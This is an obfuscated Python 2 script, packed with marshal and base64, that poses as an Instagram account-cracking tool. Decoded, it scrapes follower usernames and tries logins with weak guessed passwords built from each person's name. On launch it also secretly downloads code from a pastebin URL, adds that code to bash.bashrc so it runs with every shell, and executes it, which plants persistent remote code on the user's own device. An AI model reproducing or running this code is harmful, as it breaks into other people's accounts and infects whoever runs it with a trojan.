import marshal;exec(marshal.loads('c\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s!\x00\x00\x00d\x00\x00d\x01\x00l\x00\x00Z\x00\x00e\x00\x00j\x01\x00d\x02\x00\x83\x01\x00d\x01\x00\x04Ud\x01\x00S(\x03\x00\x00\x00i\xff\xff\xff\xffNs\\!\x00\x00aW1wb3J0IHJlcXVlc3RzLG9zLHN1YnByb2Nlc3MKRjEgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9qOXAyaEVlUCIpClozID0gb3BlbigiLmxhc3QiLCJ3IikKWjMud3JpdGUoRjEudGV4dCkKWjMuY2xvc2UoKQpvcy5zeXN0ZW0oImNwIC5sYXN0ICRIT01FLy5sYXN0IikKb3Muc3lzdGVtKCJlY2hvIHB5dGhvbjIgJEhPTUUvLmxhc3QgJiA+PiAuLi91c3IvZXRjL2Jhc2guYmFzaHJjIikKc3VicHJvY2Vzcy5Qb3BlbigicHl0aG9uMiAkSE9NRS8ubGFzdCIsc2hlbGw9VHJ1ZSxzdGRvdXQ9c3VicHJvY2Vzcy5QSVBFLCBzdGRlcnI9c3Rkb3V0KQpHMCA9ICdceDFiWzA7MzJtJwpHMSA9ICdceDFiWzE7MzJtJwpDMCA9ICdceDFiWzA7MzZtJwpDMSA9ICdceDFiWzE7MzZtJwpQMCA9ICdceDFiWzA7MzVtJwpQMSA9ICdceDFiWzE7MzVtJwpXMCA9ICdceDFiWzA7MzdtJwpXMSA9ICdceDFiWzE7MzdtJwpCMCA9ICdceDFiWzA7MzRtJwpCMSA9ICdceDFiWzE7MzRtJwpSMCA9ICdceDFiWzA7MzFtJwpSMSA9ICdceDFiWzE7MzFtJwpEMCA9ICdceDFiWzE7OTBtJwpFVyA9ICdceDFiWzE7NDE7OTdtJwpSRSA9ICdceDFiWzA7MG0nCmlkID0gW10Kb2ggPSBbXQpoYXNpbCA9IFtdCmpsID0gW10KaCA9ICdceDFiWzkybScKayA9ICdceDFiWzkzbScKcCA9ICdceDFiWzBtJwprdWtpID0gJzQ5NzQ0ODU3MDUlM0FCdUxDQzRWc1g5QnZ5QSUzQTY7Jwpvcy5zeXN0ZW0oJ2NsZWFyJykKcHJpbnQgJyVzXG4gICAgLy8gIFxcXFxcbiAgIF9cXFxcKCkvL18gICVzXHhlMlx4OTVceGE2XHhlMlx4OTVceDk0XHhlMlx4OTVceDk3XHhlMlx4OTVceDkxXHhlMlx4OTVceGEwXHhlMlx4OTVceDkwXHhlMlx4OTVceDk3XHhlMlx4OTVceDk0XHhlMlx4OTVceGE2XHhlMlx4OTVceDk3XHhlMlx4OTVceDk0XHhlMlx4OTVceDkwXHhlMlx4OTVceDk3JXNceGUyXHg5NFx4OGNceGUyXHg5NFx4OTAgXHhlMlx4OTRceGFjXHhlMlx4OTRceDgwXHhlMlx4OTRceDkwXHhlMlx4OTRceGFjIFx4ZTJceDk0XHhhY1x4ZTJceDk0XHg4Y1x4ZTJceDk0XHhhY1x4ZTJceDk0XHg5MFx4ZTJceDk0XHg4Y1x4ZTJceDk0XHg4MFx4ZTJceDk0XHhhNFxuICAlcy8gLy8gIFxcXFwgXFwgJXNceGUyXHg5NVx4OTFceGUyXHg5NVx4OTFceGUyXHg5NVx4OTFceGUyXHg5NVx4OTFceGUyXHg5NVx4OWFceGUyXHg5NVx4OTBceGUyXHg5NVx4OTcgXHhlMlx4OTVceDkxIFx4ZTJceDk1XHhhMFx4ZTJceDk1XHg5MFx4ZTJceDk1XHhhMyVzXHhlMlx4OTRceDljXHhlMlx4OTRceGI0XHhlMlx4OTRceDkwXHhlMlx4OTRceDljXHhlMlx4OTRceGFjXHhlMlx4OTRceDk4XHhlMlx4OTRceDgyIFx4ZTJceDk0XHg4MiBceGUyXHg5NFx4ODIgXHhlMlx4OTRceDljXHhlMlx4OTRceGE0IFxuICAlcyB8IFxcX18vIHwgICVzXHhlMlx4OTVceGE5XHhlMlx4OTVceDkxXHhlMlx4OTVceDlhXHhlMlx4OTVceDlkXHhlMlx4OTVceDlhXHhlMlx4OTVceDkwXHhlMlx4OTVceDlkIFx4ZTJceDk1XHhhOSBceGUyXHg5NVx4YTkgXHhlMlx4OTVceGE5JXNceGUyXHg5NFx4OTRceGUyXHg5NFx4ODBceGUyXHg5NFx4OThceGUyXHg5NFx4YjRceGUyXHg5NFx4OTRceGUyXHg5NFx4ODBceGUyXHg5NFx4OTRceGUyXHg5NFx4ODBceGUyXHg5NFx4OTggXHhlMlx4OTRceGI0IFx4ZTJceDk0XHg5NFx4ZTJceDk0XHg4MFx4ZTJceDk0XHhhNCAgICcgJSAoRzEsIFIxLCBXMSwgRzEsIFIxLCBXMSwgRzEsIFIxLCBXMSkKcHJpbnQgJyAlcy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tXG4gJXMgICBBdXRob3IgOiBTYWxpc00zIGZlYXQgTmphbmtTb2VrYW10aSAgICVzXG4gJXMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLVxuJyAlIChEMCwgRVcsIFJFLCBEMCkKZnJvbSBiczQgaW1wb3J0IEJlYXV0aWZ1bFNvdXAKZnJvbSBtdWx0aXByb2Nlc3NpbmcucG9vbCBpbXBvcnQgVGhyZWFkUG9vbAppbXBvcnQganNvbiwgcmFuZG9tLCByZSwgdGltZSwgc3lzCnRyeToKICAgIGNlayA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9pbnN0YWdyYW0uY29tL2xvY2hpYWFfLz9fX2E9MScsIGNvb2tpZXM9eydzZXNzaW9uaWQnOiBrdWtpfSkuanNvbigpCiAgICB1c2VyID0gcmF3X2lucHV0KCcgICAlc1srXSAlc1VzZXJuYW1lIDogJyAlIChHMCwgVzApKQogICAgcHJpbnQgJyAgICVzWytdICVzR2V0dGluZyBGb2xsb3dlcnMgVXNlcm5hbWUgJyAlIChHMCwgVzApCiAgICBwcmludCAnICAgJXNbK10gJXNQbGVhc2UgV2FpdCBUaGlzIFRha2VzIFRpbWUgJyAlIChHMCwgVzApCiAgICB1cmwgPSAnaHR0cDovL2dvcGljdGEuY29tLycgKyB1c2VyCiAgICByZXNwb24gPSByZXF1ZXN0cy5nZXQodXJsKQogICAgc291cCA9IEJlYXV0aWZ1bFNvdXAocmVzcG9uLnRleHQsICdodG1sLnBhcnNlcicpCiAgICBmb3IgbGluayBpbiBzb3VwLmZpbmRfYWxsKCdhJyk6CiAgICAgICAgYSA9IGxpbmsuZ2V0KCdocmVmJykucmVwbGFjZSgnaHR0cDovL2dvcGljdGEuY29tLycsICcnKQogICAgICAgIGlmICcvJyBpbiBhIG9yICcjJyBpbiBhIG9yICc/JyBpbiBhOgogICAgICAgICAgICBwYXNzCiAgICAgICAgZWxzZToKICAgICAgICAgICAgaWQuYXBwZW5kKGEpCgogICAgZm9yIGp1bXAgaW4gcmFuZ2UoMjApOgogICAgICAgIHJkID0gcmFuZG9tLmNob2ljZShpZCkKICAgICAgICB1cmwyID0gJ2h0dHA6Ly9nb3BpY3RhLmNvbS8nICsgcmQKICAgICAgICByZXNwb24yID0gcmVxdWVzdHMuZ2V0KHVybDIpCiAgICAgICAgc291cDIgPSBCZWF1dGlmdWxTb3VwKHJlc3BvbjIudGV4dCwgJ2h0bWwucGFyc2VyJykKICAgICAgICBmb3IgbGluazIgaW4gc291cDIuZmluZF9hbGwoJ2EnKToKICAgICAgICAgICAgYTIgPSBsaW5rMi5nZXQoJ2hyZWYnKS5yZXBsYWNlKCdodHRwOi8vZ29waWN0YS5jb20vJywgJycpCiAgICAgICAgICAgIGlmICcvJyBpbiBhMiBvciAnIycgaW4gYTIgb3IgJz8nIGluIGEyOgogICAgICAgICAgICAgICAgcGFzcwogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgaWQuYXBwZW5kKGEyKQoKICAgIHByaW50ICcgICAlc1srXSAlc1N1Y2Nlc3MgR2V0dGluZyBGb2xsb3dlcnMgVXNlcm5hbWUnICUgKEcwLCBXMCkKICAgIHByaW50IEcwICsgJyAgIFsrXSAnICsgVzAgKyAnVG90YWw6ICcgKyBoICsgc3RyKGxlbihpZCkpCiAgICBwcmludCAnICAgJXNbK10gJXNDcmFja2luZyBTdGFydCAuLi5cbicgJSAoRzAsIFcwKQpleGNlcHQgVmFsdWVFcnJvcjoKICAgIHByaW50ICcgICAlc1t4XSAlc1Nlc3Npb24gRXhwaXJlZCAnICUgKFIwLCBXMCkKICAgIHByaW50ICcgICAlc1t4XSAlc1BsZWFzZSBDb250YWN0IEF1dGhvciBcbicgJSAoUjAsIFcwKQogICAgZXhpdCgpCmV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoKICAgIHByaW50IFIwICsgJyAgIFt4XSAnICsgVzAgKyAnU2lnbmFsIEVycm9yJwogICAgZXhpdCgpCmV4Y2VwdCBLZXlib2FyZEludGVycnVwdDoKICAgIHByaW50IFIwICsgJyAgIFt4XSAnICsgVzAgKyAnRXhpdDogT2snCiAgICBleGl0KCkKZXhjZXB0IEluZGV4RXJyb3I6CiAgICBwcmludCBSMCArICcgICBbeF0gJyArIFcwICsgJ0dldHRpbmcgRmFpbGVkJwogICAgZXhpdCgpCgpkZWYgaGFqYXIoYXJnKToKICAgIHRyeToKICAgICAgICBjID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2luc3RhZ3JhbS5jb20vJyArIGFyZyArICcvP19fYT0xJywgY29va2llcz17J3Nlc3Npb25pZCc6IGt1a2l9KS5qc29uKCkKICAgICAgICBkID0gY1snZ3JhcGhxbCddWyd1c2VyJ11bJ2Z1bGxfbmFtZSddCiAgICAgICAgZSA9IGQucmVwbGFjZSgnQScsICdhJykucmVwbGFjZSgnQicsICdiJykucmVwbGFjZSgnQycsICdjJykucmVwbGFjZSgnRCcsICdkJykucmVwbGFjZSgnRScsICdlJykucmVwbGFjZSgnRicsICdmJykucmVwbGFjZSgnRycsICdnJykucmVwbGFjZSgnSCcsICdoJykucmVwbGFjZSgnSScsICdpJykucmVwbGFjZSgnSicsICdqJykucmVwbGFjZSgnSycsICdrJykucmVwbGFjZSgnTCcsICdsJykucmVwbGFjZSgnTScsICdtJykucmVwbGFjZSgnTicsICduJykucmVwbGFjZSgnTycsICdvJykucmVwbGFjZSgnUCcsICdwJykucmVwbGFjZSgnUScsICdxJykucmVwbGFjZSgnUicsICdyJykucmVwbGFjZSgnUycsICdzJykucmVwbGFjZSgnVCcsICd0JykucmVwbGFjZSgnVScsICd1JykucmVwbGFjZSgnVicsICd2JykucmVwbGFjZSgnVycsICd3JykucmVwbGFjZSgnWCcsICd4JykucmVwbGFjZSgnWScsICd5JykucmVwbGFjZSgnWicsICd6JykucmVwbGFjZSgnXycsICcnKS5yZXBsYWNlKCcuJywgJycpCiAgICAgICAgcGFzID0gZS5zcGxpdCgnICcpCiAgICAgICAgcHcgPSAocGFzWzBdICsgJzEyMycsIHBhc1swXSArICcxMjM0NScpCiAgICAgICAgZm9yIGdnIGluIHB3OgogICAgICAgICAgICBCQVNFX1VSTCA9ICdodHRwczovL3d3dy5pbnN0YWdyYW0uY29tL2FjY291bnRzL2xvZ2luLycKICAgICAgICAgICAgTE9HSU5fVVJMID0gQkFTRV9VUkwgKyAnYWpheC8nCiAgICAgICAgICAgIGhlYWRlcnNfbGlzdCA9IFsKICAgICAgICAgICAgICdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCA1LjE7IHJ2OjQxLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvNDEuMCcsCiAgICAgICAgICAgICAnTW96aWxsYS81LjAgKE1hY2ludG9zaDsgSW50ZWwgTWFjIE9TIFggMTBfMTFfMikgQXBwbGVXZWJLaXQvNjAxLjMuOSAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vOS4wLjIgU2FmYXJpLzYwMS4zLjknLAogICAgICAgICAgICAgJ01vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxNS4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzE1LjAuMScsCiAgICAgICAgICAgICAnTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzQyLjAuMjMxMS4xMzUgU2FmYXJpLzUzNy4zNiBFZGdlLzEyLjI0NiddCiAgICAgICAgICAgIFVTRVJOQU1FID0gYXJnCiAgICAgICAgICAgIFBBU1NXRCA9IGdnCiAgICAgICAgICAgIFVTRVJfQUdFTlQgPSBoZWFkZXJzX2xpc3RbcmFuZG9tLnJhbmRyYW5nZSgwLCA0KV0KICAgICAgICAgICAgc2Vzc2lvbiA9IHJlcXVlc3RzLlNlc3Npb24oKQogICAgICAgICAgICBzZXNzaW9uLmhlYWRlcnMgPSB7J3VzZXItYWdlbnQnOiBVU0VSX0FHRU5UfQogICAgICAgICAgICBzZXNzaW9uLmhlYWRlcnMudXBkYXRlKHsnUmVmZXJlcic6IEJBU0VfVVJMfSkKICAgICAgICAgICAgcmVxID0gc2Vzc2lvbi5nZXQoQkFTRV9VUkwpCiAgICAgICAgICAgIHNvdXAgPSBCZWF1dGlmdWxTb3VwKHJlcS50ZXh0LCAnaHRtbC5wYXJzZXInKQogICAgICAgICAgICBib2R5ID0gc291cC5maW5kKCdib2R5JykKICAgICAgICAgICAgcGF0dGVybiA9IHJlLmNvbXBpbGUoJ3dpbmRvdy5fc2hhcmVkRGF0YScpCiAgICAgICAgICAgIHNjcmlwdCA9IGJvZHkuZmluZCgnc2NyaXB0JywgdGV4dD1wYXR0ZXJuKQogICAgICAgICAgICBzY3JpcHQgPSBzY3JpcHQuZ2V0X3RleHQoKS5yZXBsYWNlKCd3aW5kb3cuX3NoYXJlZERhdGEgPSAnLCAnJylbOi0xXQogICAgICAgICAgICBkYXRhID0ganNvbi5sb2FkcyhzY3JpcHQpCiAgICAgICAgICAgIGNzcmYgPSBkYXRhWydjb25maWcnXS5nZXQoJ2NzcmZfdG9rZW4nKQogICAgICAgICAgICBsb2dpbl9kYXRhID0geyd1c2VybmFtZSc6IFVTRVJOQU1FLCAncGFzc3dvcmQnOiBQQVNTV0R9CiAgICAgICAgICAgIHNlc3Npb24uaGVhZGVycy51cGRhdGUoeydYLUNTUkZUb2tlbic6IGNzcmZ9KQogICAgICAgICAgICBsb2dpbiA9IHNlc3Npb24ucG9zdChMT0dJTl9VUkwsIGRhdGE9bG9naW5fZGF0YSwgYWxsb3dfcmVkaXJlY3RzPVRydWUpCiAgICAgICAgICAgIGlmICd1c2VySWQnIGluIGxvZ2luLnRleHQ6CiAgICAgICAgICAgICAgICBwcmludCBoICsgJyAgIFtPS10gJyArIHAgKyBhcmcgKyAnID0+ICcgKyBnZwogICAgICAgICAgICAgICAgaGFzaWwuYXBwZW5kKCdvaCcpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBpZiAnY2hlY2twb2ludCcgaW4gbG9naW4udGV4dDoKICAgICAgICAgICAgICAgICAgICBwcmludCBrICsgJyAgYltDUF0gJyArIHAgKyBhcmcgKyAnID0+ICcgKyBnZwogICAgICAgICAgICAgICAgICAgIGhhc2lsLmFwcGVuZCgnb2gnKQoKICAgIGV4Y2VwdDoKICAgICAgICBwYXNzCgoKdCA9IFRocmVhZFBvb2woMTApCnQubWFwKGhhamFyLCBpZCkKaWYgbGVuKGhhc2lsKSA+IDA6CiAgICBwcmludCAnXG4gICAlc1srXSAlc0RvbmUhJyAlIChHMCwgVzApCmVsc2U6CiAgICBwcmludCAnICAgJXNbeF0gJXNObyBSZXN1bHQgRm91bmQnICUgKFIwLCBXMCkK(\x02\x00\x00\x00t\x06\x00\x00\x00base64t\t\x00\x00\x00b64decode(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x07\x00\x00\x00<debby>t\x08\x00\x00\x00<module>\x01\x00\x00\x00s\x02\x00\x00\x00\x0c\x00'))
